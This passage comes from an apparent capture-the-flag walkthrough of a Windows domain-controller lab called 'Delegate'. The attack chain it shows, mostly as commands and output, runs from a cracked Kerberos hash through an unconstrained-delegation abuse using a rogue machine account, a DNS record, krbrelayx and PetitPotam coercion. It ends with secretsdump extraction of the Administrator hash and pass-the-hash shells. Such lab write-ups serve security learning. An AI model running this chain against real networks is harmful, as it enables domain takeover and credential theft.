855ae1be81a4861b13434548c4c1144ce5f4dd2279b58893014e4b8ec71967295ccdafc6c41eebdd02c58748eaeb9696e26f9aea9563c382eb51363cc4ab55f5136c017495a0c8995e7b392c64573f0210873a0210f3c753ff996aa2112d82d7027d66de024058abaf  
3bff15f911fb40fcd7670700f3a04885402728dc3ec21b6483800818cefa5153c5b8545af6f758eef77e7f90435f1e200d00d4cdad8c8967f160587d70b1c6a965b9c72ef7156166ea31110f1020b74558dfec35a7e46527101d732bf6102de011dbaca27e8eb03ae9  
4ea6dc8c9d34ed234d6a2234c602dda8990d04e748d370de2a1ba35e2cbcc68f015b534496f1ff278cf592ccec272dd0fc4ec167794bec10ef679eb10520de27f12c2eed15928ef455f185d6679e14e05ff24e46f947a1e99bd9276b9796f6e2b327033bc72b30985f  
6d76c0a54bc51f278b9bf59987a629e4fb0e9500afd34f329aef2f2301fe968c8c8c08fca3b326107ba5fe1571dc4d42d746bc398fd873ce6e01aba2b19d254a5cea297821cc7a6d2f869ffb3ba58fd6f73c664cebf12adbeb8e7bf710c31051b5cdddcedc8f6269f7  
5b46efcf7ad39f3b72583316b69b9e4f90a7d6f84c5a3cf8da5a061700121a8181b2fb9a552808d536678303842c2618c206e62c3684ec484708fe9912012801cbd75a4242b9e0dd64024515cbad4abcc0e265b44efe5a088b6d98242e6fa24012ff333531d644e6b1  
9a4a7b2f1c9489fcf20dae5f39758891b1d723671e0af8b4d1ae5714889db3f86cce403004ef0788914124e6fe727442ea46401bab1a13a90b3c5f5938f2525e0089793626bc60b0a1b446d64c4a9323b6607cbb3cfcee80eb6006ee94dad48b22803a7e09ae358cb4  
55ae36f9afef4efc6d899d3e05d32a42c5dd7b4cd7ae5a26f:KALEB_2341  
                                                            
Session..........: hashcat  
Status...........: Cracked  
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)  
Hash.Target......: $krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.T...e5a26f  
Time.Started.....: Mon May 25 13:07:50 2026 (8 secs)  
Time.Estimated...: Mon May 25 13:07:58 2026 (0 secs)  
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)  
Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)  
Guess.Queue......: 1/1 (100.00%)  
Speed.#01........:  1407.5 kH/s (3.90ms) @ Accel:1024 Loops:1 Thr:1 Vec:8  
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)  
Progress.........: 11010048/14344384 (76.76%)  
Rejected.........: 0/11010048 (0.00%)  
Restore.Point....: 11001856/14344384 (76.70%)  
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1  
Candidate.Engine.: Device Generator  
Candidates.#01...: KANGOEROEHOFJE -> Joythedog  
Hardware.Mon.#01.: Temp: 71c Util: 67%  
  
Started: Mon May 25 13:07:22 2026  
Stopped: Mon May 25 13:07:59 2026
```

Cracked : KALEB_2341

Then, we try a shell :

```Powershell
>  evil-winrm -i 10.129.234.69 -u N.Thompson -p 'KALEB_2341'  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 4.0.0.  
You can add reline to your Gemfile or gemspec to silence this warning.  
                                          
Evil-WinRM shell v3.9  
                                          
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
                                          
Info: Establishing connection to remote endpoint  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
*Evil-WinRM* PS C:\Users\N.Thompson\Documents>cd \
*Evil-WinRM* PS C:\> cd \Users\N.Thompson\Desktop  
*Evil-WinRM* PS C:\Users\N.Thompson\Desktop> dir  
  
  
   Directory: C:\Users\N.Thompson\Desktop  
  
  
Mode                 LastWriteTime         Length Name  
----                 -------------         ------ ----  
-ar---         5/25/2026   2:23 AM             34 user.txt  
  
  
*Evil-WinRM* PS C:\Users\N.Thompson\Desktop> cat user.txt  
351138f86316937ff8452b2d57794b80
```

And we got the user flag !

```bash
*Evil-WinRM* PS C:\Users\N.Thompson\Desktop> whoami /priv  
  
PRIVILEGES INFORMATION  
----------------------  
  
Privilege Name                Description                                                    State  
============================= ============================================================== =======  
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled  
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled  
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled  
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled
```

We can see `SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled` which is a crusty privilege to have.

I upload winPEAS on the target :

```PowerShell
*Evil-WinRM* PS C:\Users\N.Thompson\Desktop> upload /usr/share/windows/peass/winPEASx64.exe

Info: Uploading /usr/share/windows/peass/winPEASx64.exe to C:\Users\N.Thompson\Desktop\winPEASx64.exe  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
                                          
Data: 13541376 bytes of 13541376 bytes copied  
                                          
Info: Upload successful!
```

```PowerShell
*Evil-WinRM* PS C:\Users\N.Thompson\Desktop> .\winPEASx64.exe quiet > winpeas.txt  
The term '.\winPEASx64.exe' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and  
try again.  
At line:1 char:1  
+ .\winPEASx64.exe quiet > winpeas.txt  
+ ~~~~~~~~~~~~~~~~  
   + CategoryInfo          : ObjectNotFound: (.\winPEASx64.exe:String) [], CommandNotFoundException

*Evil-WinRM* PS C:\Users\N.Thompson\Desktop> dir winPEASx64.exe  
Cannot find path 'C:\Users\N.Thompson\Desktop\winPEASx64.exe' because it does not exist.  
At line:1 char:1  
+ dir winPEASx64.exe  
+ ~~~~~~~~~~~~~~~~~~  
   + CategoryInfo          : ObjectNotFound: (C:\Users\N.Thom...\winPEASx64.exe:String) [Get-ChildItem], ItemNotFoundException  
   + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand
```

It seems the upload failed or winPEAS was deleted or quarantined after being uploaded by the firewall.

We'll try to upload it in /tmp under a different name :

```PowerShell
*Evil-WinRM* PS C:\Users\N.Thompson\Desktop> cd \
*Evil-WinRM* PS C:\> cd /Tmp  
*Evil-WinRM* PS C:\Tmp> upload /usr/share/windows/peass/winPEASx64.exe wp.exe  
                                          
Info: Uploading /usr/share/windows/peass/winPEASx64.exe to C:\Tmp\wp.exe

*Evil-WinRM* PS C:\Tmp> .\wp.exe quiet > winpeas.txt  
Program 'wp.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1  
+ .\wp.exe quiet > winpeas.txt  
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~.  
At line:1 char:1  
+ .\wp.exe quiet > winpeas.txt  
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
   + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException  
   + FullyQualifiedErrorId : NativeCommandFailed
```

It seems the Domain Control security is too tight for winPEAS to work here.

```PowerShell
*Evil-WinRM* PS C:\Tmp> whoami /groups  
   
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
  
GROUP INFORMATION  
-----------------  
  
Group Name                                  Type             SID                                            Attributes  
=========================================== ================ ============================================== ==================================================  
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group  
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group  
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group  
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group  
DELEGATE\delegation admins                  Group            S-1-5-21-1484473093-3449528695-2030935120-1121 Mandatory group, Enabled by default, Enabled group  
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group  
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448  
*Evil-WinRM* PS C:\Users\N.Thompson\Documents>
```

We see we are in `delegation admins` with the `S-1-5-21-1484473093-3449528695-2030935120-1121` SID as well as `Remote Management Users`.

```bash
bloodhound
```

On `Bloodhound`, N.Thompson `CanPSRemote` the Windows Server `DC1.DELEGATE.VL` which is `Windows Server 2022 Standard` running on `10.0 (20348)` (`nmap` showed this as a hypothesis : `2022|10|11|2012|2016` we now know it's Windows 2022, which explains the linPEAS failure and the tight firewall.

We change strategies : `SeMachineAccountPrivilege` is another privilege with the `Delegation` privilege (which is the name of the room, hinting it's the main privilege to use but maybe not the only one).

```bash
>  addcomputer.py -dc-ip 10.129.234.69 'delegate.vl/N.Thompson:KALEB_2341' -computer-name scrow  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Successfully added machine account scrow$ with password R9D4tBY7F0LzXDFgTvI5c5COIqeDWPzO.
```

Then, with the given password, we connect through evil-winrm and will try to `Delegate` with `SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled` on N.Thompson.

```PowerShell
>  evil-winrm -i 10.129.234.69 -u scrow -p 'R9D4tBY7F0LzXDFgTvI5c5COIqeDWPzO'  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 4.0.0.  
You can add reline to your Gemfile or gemspec to silence this warning.  
                                          
Evil-WinRM shell v3.9  
                                          
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
                                          
Info: Establishing connection to remote endpoint  
*Evil-WinRM* PS C:\>dir
```

The shell crashes. The account created is merely a work in progress for now, not a user.

We'll try to add the new user registered as scrow, `scrow$`, to be trusted for delegation using `bloodyad` :

```bash
>  bloodyad -d delegatevl -u 'N.Thompson' -p 'KALEB_2341' -H 10.129.234.69 -i 10.129.234.69 add uac scrow$ -f TRUSTED_FOR_DELEGATION  
/usr/share/bloodyad/bloodyAD/network/ldap.py:715: SyntaxWarning: 'return' in a 'finally' block  
 return search_results  
/usr/share/bloodyad/bloodyAD/network/ldap.py:770: SyntaxWarning: 'return' in a 'finally' block  
 return search_result  
[+] ['TRUSTED_FOR_DELEGATION'] property flags added to scrow$'s userAccountControl
```

We verify `object scrow$`'s User Account control :

```bash
>  bloodyad -d delegate.vl -u 'N.Thompson' -p 'KALEB_2341' -H 10.129.234.69 -i 10.129.234.69 get object scrow$ --attr userAccountControl  
/usr/share/bloodyad/bloodyAD/network/ldap.py:715: SyntaxWarning: 'return' in a 'finally' block  
 return search_results  
/usr/share/bloodyad/bloodyAD/network/ldap.py:770: SyntaxWarning: 'return' in a 'finally' block  
 return search_result  
  
distinguishedName: CN=scrow,CN=Computers,DC=delegate,DC=vl  
userAccountControl: WORKSTATION_TRUST_ACCOUNT; TRUSTED_FOR_DELEGATION
```

We now give a servicePrincipalName (SPN) to `scrow` through N.Thompson to allow kerberos authentication :

```bash
>  bloodyad -d delegate.vl -u 'N.Thompson' -p 'KALEB_2341' -H 10.129.234.69 -i 10.129.234.69 set object scrow$ servicePrincipalName -v 'cifs/scrow'  
/usr/share/bloodyad/bloodyAD/network/ldap.py:715: SyntaxWarning: 'return' in a 'finally' block  
 return search_results  
/usr/share/bloodyad/bloodyAD/network/ldap.py:770: SyntaxWarning: 'return' in a 'finally' block  
 return search_result  
[+] scrow$'s servicePrincipalName has been updated
```

We then bind our tun IP to the target using `scrow` and verify with `dig` :

```bash
>  python3 krbrelayx/dnstool.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -r scrow.delegate.vl -d 10.10.14.12 --action add 10.129.234.69  
[-] Connecting to host...  
[-] Binding to host  
[+] Bind OK  
[-] Adding new record  
[+] LDAP operation completed successfully

>  dig @10.129.234.69 scrow.delegate.vl A +short
```

Didn't show my tun address at the end, so `--action query 10.129.234.69` might work.

```bash
>  python3 krbrelayx/dnstool.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -r scrow.delegate.vl --action query 10.129.234.69  
  
[-] Connecting to host...  
[-] Binding to host  
[+] Bind OK  
[+] Found record scrow  
DC=scrow,DC=Delegate.vl,CN=MicrosoftDNS,DC=DomainDnsZones,DC=delegate,DC=vl  
[+] Record entry:  
- Type: 1 (A) (Serial: 361)  
- Address: 10.10.14.12
```

It seems to have worked, still, verifying with dig :

```bash
>  dig @10.129.234.69 scrow.delegate.vl A +short  
10.10.14.12
```

We get the hash from the `scrow` generated password :

```bash
>  python3 -c "from Cryptodome.Hash import MD4; p='R9D4tBY7F0LzXDFgTvI5c5COIqeDWPzO'; print(MD4.new(p.encode('utf-16le')).hexdigest())"  
  
31972af211154b72bc1991d10f7aaa36
```

And establish a listener :

```bash
>  cd ~/krbrelayx  
sudo python3 krbrelayx.py -hashes :31972af211154b72bc1991d10f7aaa36  
  
[sudo] password for vagabond:    
[*] Protocol Client SMB loaded..  
[*] Protocol Client HTTP loaded..  
[*] Protocol Client HTTPS loaded..  
[*] Protocol Client LDAPS loaded..  
[*] Protocol Client LDAP loaded..  
[*] Running in export mode (all tickets will be saved to disk). Works with unconstrained delegation attack only.  
[*] Running in unconstrained delegation abuse mode using the specified credentials.  
[*] Setting up SMB Server  
[*] Setting up HTTP Server on port 80  
[*] Setting up DNS Server  
  
[*] Servers started, waiting for connections
```

We download PetitPotam to coerce authentication from `scrow` and execute it on another terminal :

```bash
>  cd ~/krbrelayx  
python3 PetitPotam.py -target-ip 10.129.234.69 -u 'scrow$' -p 'R9D4tBY7F0LzXDFgTvI5c5COIqeDWPzO' scrow dc1.delegate.vl  
/home/vagabond/krbrelayx/PetitPotam.py:23: SyntaxWarning: "\ " is an invalid escape sequence. Such sequences will not work in the future. Did you mean "\\ "? A raw string is also an option.  
 | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __  
  
                                                                                                 
             ___            _        _      _        ___            _                        
            | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __      
            |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \     
           _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_|    
         _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""|    
         "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'    
                                           
             PoC to elicit machine account authentication via some MS-EFSRPC functions  
                                     by topotam (@topotam77)  
        
                    Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN  
  
  
  
Trying pipe lsarpc  
[-] Connecting to ncacn_np:dc1.delegate.vl[\PIPE\lsarpc]  
[+] Connected!  
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e  
[+] Successfully bound!  
[-] Sending EfsRpcOpenFileRaw!  
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!  
[+] OK! Using unpatched function!  
[-] Sending EfsRpcEncryptFileSrv!  
[+] Got expected ERROR_BAD_NETPATH exception!!  
[+] Attack worked!
```

The listener we established received :

```bash
[*] Servers started, waiting for connections  
[*] SMBD: Received connection from 10.129.234.69  
[*] Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]  
[*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache  
[*] SMBD: Received connection from 10.129.234.69  
[*] Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]  
[*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
```

Then, we export as KRB5CCNAME the ticket :

```bash
>  export KRB5CCNAME="$(pwd)/DC1\$DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache"
```

We try to login with that ticket as Administrator :

```bash
>  secretsdump.py -just-dc-user Administrator -k -no-pass dc1.delegate.vl -dc-ip 10.129.234.69  
  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)  
[*] Using the DRSUAPI method to get NTDS.DIT secrets  
[-] [Errno 2] No such file or directory: '/home/vagabond/krbrelayx/DC1$DC1DELEGATE.VL_krbtgt@DELEGATE.VL.ccache'  
[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter  
[*] Cleaning up...
```

I was wondering what was wrong, but it seems the syntax was :

```bash
>  cd ~/krbrelayx  
ls -la *.ccache  
export KRB5CCNAME="$PWD/'DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache'"  
-rw-r--r-- 1 root root 1317 May 25 22:14 'DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache'  
>  export KRB5CCNAME="$PWD/DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache"  
  
>  cd ~/krbrelayx  
cp 'DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache' dc1.ccache  
export KRB5CCNAME="$PWD/dc1.ccache"
```

Then, we use secretsdump again :

```bash
>  secretsdump.py -just-dc-user Administrator -k -no-pass dc1.delegate.vl -dc-ip 10.129.234.69  
  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)  
[*] Using the DRSUAPI method to get NTDS.DIT secrets  
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c32198ceab4cc695e65045562aa3ee93:::  
[*] Kerberos keys grabbed  
Administrator:aes256-cts-hmac-sha1-96:f877adcb278c4e178c430440573528db38631785a0afe9281d0dbdd10774848c  
Administrator:aes128-cts-hmac-sha1-96:3a25aca9a80dfe5f03cd03ea2dcccafe  
Administrator:des-cbc-md5:ce257f16ec25e59e  
[*] Cleaning up...
```

We got Administrator hash ':c32198ceab4cc695e65045562aa3ee93'

```bash
>  psexec.py 'DC1.DELEGATE.VL/administrator@10.129.234.69' -hashes ':c32198ceab4cc695e65045562aa3ee93'  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Requesting shares on 10.129.234.69.....  
[*] Found writable share ADMIN$  
[*] Uploading file izYntgQK.exe  
[*] Opening SVCManager on 10.129.234.69.....  
[*] Creating service PaoL on 10.129.234.69.....  
[*] Starting service PaoL.....  
[*] Opening SVCManager on 10.129.234.69.....  
[-] Error performing the uninstallation, cleaning up
```

I'll try with Evil-WinRM to get a shell :

```PowerShell
>  evil-winrm -i 10.129.234.69 -u Administrator -H c32198ceab4cc695e65045562aa3ee93  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 4.0.0.  
You can add reline to your Gemfile or gemspec to silence this warning.  
                                          
Evil-WinRM shell v3.9  
                                          
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
                                          
Info: Establishing connection to remote endpoint  
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd /Users/Administrator/Desktop  
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir  
  
  
   Directory: C:\Users\Administrator\Desktop  
  
  
Mode                 LastWriteTime         Length Name  
----                 -------------         ------ ----  
-ar---         5/25/2026   2:23 AM             34 root.txt  
  
  
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt  
81a730a537e03943ea48a9d11ad7471f
```

And we finally got the root flag !

```PowerShell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> systeminfo  
  
Host Name:                 DC1  
OS Name:                   Microsoft Windows Server 2022 Standard  
OS Version:                10.0.20348 N/A Build 20348  
OS Manufacturer:           Microsoft Corporation  
OS Configuration:          Primary Domain Controller  
OS Build Type:             Multiprocessor Free  
Registered Owner:          Windows User  
Registered Organization:  
Product ID:                00453-60522-44768-AA520  
Original Install Date:     8/26/2023, 1:33:27 AM  
System Boot Time:          5/25/2026, 2:22:22 AM  
System Manufacturer:       VMware, Inc.  
System Model:              VMware20,1  
System Type:               x64-based PC  
Processor(s):              1 Processor(s) Installed.  
                          [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz  
BIOS Version:              VMware, Inc. VMW201.00V.24504846.B64.2501180339, 1/18/2025  
Windows Directory:         C:\Windows  
System Directory:          C:\Windows\system32  
Boot Device:               \Device\HarddiskVolume2  
System Locale:             en-us;English (United States)  
Input Locale:              it;Italian (Italy)  
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)  
Total Physical Memory:     4,095 MB  
Available Physical Memory: 2,130 MB  
Virtual Memory: Max Size:  4,799 MB  
Virtual Memory: Available: 3,055 MB  
Virtual Memory: In Use:    1,744 MB  
Page File Location(s):     C:\pagefile.sys  
Domain:                    delegate.vl  
Logon Server:              N/A  
Hotfix(s):                 3 Hotfix(s) Installed.  
                          [01]: KB5062063  
                          [02]: KB5063880  
                          [03]: KB5062793  
Network Card(s):           1 NIC(s) Installed.  
                          [01]: vmxnet3 Ethernet Adapter  
                                Connection Name: Ethernet0 2  
                                DHCP Enabled:    Yes  
                                DHCP Server:     10.10.10.2  
                                IP address(es)  
                                [01]: 10.129.234.69  
                                [02]: fe80::73c3:a80b:807:941b  
                                [03]: dead:beef::54fd:1a14:bd70:b613  
                                [04]: dead:beef::f8  
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```
